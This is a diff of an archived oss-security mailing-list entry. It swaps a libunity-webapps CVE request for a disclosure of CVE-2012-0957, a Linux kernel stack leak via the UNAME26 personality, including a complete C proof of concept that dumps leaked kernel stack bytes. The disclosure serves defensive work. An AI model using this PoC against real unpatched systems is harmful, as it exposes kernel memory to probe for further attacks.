@@ -1,24 +1,87 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/10/28/3
-Message-ID: <508D5135.2050103@canonical.com>
-Date: Sun, 28 Oct 2012 15:37:25 +0000
-From: Chris Coulson <chris.coulson@...onical.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/10/09/4
+Message-ID: <20121009201034.GE24964@outflux.net>
+Date: Tue, 9 Oct 2012 13:10:34 -0700
+From: Kees Cook <keescook@...omium.org>
 To: oss-security@...ts.openwall.com
-Subject: CVE request: use-after-free in libunity-webapps
+Subject: Linux kernel stack memory content leak via UNAME26
 Content-Type: text/plain; charset=utf-8
 
-Hi,
+CVE-2012-0957
 
-libunity-webapps provides functionality shared between browser addons 
-that are available for Firefox and Chromium. A use-after-free bug was 
-found in libunity-webapps which could potentially be exploited to crash 
-the users browser or run arbitrary code.
+Calling uname() with the UNAME26 personality set allows a leak of kernel
+stack contents.
 
-Reference:
+Fix:
 
-https://launchpad.net/bugs/1068495
+https://lkml.org/lkml/2012/10/9/550
 
-Could you please allocate a CVE for this?
+PoC:
 
-Thanks,
-Chris
+
+/* Test for UNAME26 personality uname kernel stack leak.
+ * Copyright 2012, Kees Cook <keescook@...omium.org>
+ * License: GPLv3
+ */
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <errno.h>
+#include <unistd.h>
+#include <sys/personality.h>
+#include <sys/utsname.h>
+
+#define UNAME26 0x0020000
+
+int dump_uts(void)
+{
+	int i, leaked = 0;
+	struct utsname buf = { };
+
+	if (uname(&buf)) {
+		perror("uname");
+		exit(1);
+	}
+	printf("%s\n", buf.release);
+
+	for (i = strlen(buf.release) + 1; i < sizeof(buf.release); i++) {
+		unsigned char c = (unsigned char)buf.release[i];
+
+		printf("%02x", c);
+		if (c)
+			leaked = 1;
+	}
+	printf("\n");
+
+	return leaked ? (i - (strlen(buf.release) + 1)) : 0;
+}
+
+int main(int ac, char **av)
+{
+	int leaked;
+
+	leaked = dump_uts();
+	if (leaked) {
+		printf("Leaked %d bytes even without UNAME26!?\n", leaked);
+		return 1;
+	}
+
+
+	if (personality(PER_LINUX | UNAME26) < 0) {
+		perror("personality");
+		exit(1);
+	}
+
+	leaked = dump_uts();
+	if (leaked) {
+		printf("Leaked %d bytes!\n", leaked);
+		return 1;
+	} else {
+		printf("Seems safe.\n");
+		return 0;
+	}
+}
+
+-- 
+Kees Cook
+Chrome OS Security
